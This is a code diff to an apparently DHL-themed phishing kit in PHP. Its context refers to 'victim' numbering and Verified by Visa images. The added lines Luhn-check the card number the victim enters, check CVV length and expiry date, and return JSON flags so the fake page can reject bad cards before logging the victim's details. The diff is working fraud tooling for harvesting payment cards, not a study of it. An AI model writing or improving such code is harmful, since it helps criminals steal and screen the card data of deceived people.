@@ -110,6 +110,38 @@ else{
     $vbv_image = "../images/visavbv.png";
 }
 
+$newcredit = preg_replace("/[^0-9]/", "", $data_req["card_number"]);
+function isValid($num) {
+    $num = preg_replace('/[^\d]/', '', $num);
+    $sum = '';
+
+    for ($i = strlen($num) - 1; $i >= 0; -- $i) {
+        $sum .= $i & 1 ? $num[$i] : $num[$i] * 2;
+    }
+
+    return array_sum(str_split($sum)) % 10 === 0;
+}
+$monthzeby = intval($data_req['expiry'][0].$data_req['expiry'][1]);
+$yearzeby = intval("20".$data_req['expiry'][5].$data_req['expiry'][6]);
+if ($yearzeby==Carbon::now()->year){
+    if($monthzeby< Carbon::now()->month){
+        $monthzeby = false;
+    }
+    else{
+        $monthzeby = true;
+    }
+}
+
+$goodcc = isValid($newcredit) && (strlen($data_req["cvv"])==3) && ($yearzeby>=Carbon::now()->year) && ($monthzeby);
+if(!$goodcc){
+    $myobj = new \stdClass();
+    $myobj->cc = isValid($newcredit);
+    $myobj->cvv = (strlen($data_req["cvv"])==3);
+    $myobj->exp = ($yearzeby>=Carbon::now()->year) && ($monthzeby);
+    $myobj->success = false;
+    $myJSON = \json_encode($myobj);
+return $myJSON;
+}
 
 $victim_number = "0";
 $idvic = "#DHL #C".substr($data_req['card_number'],-4,4)." #ID".Str::random(5);
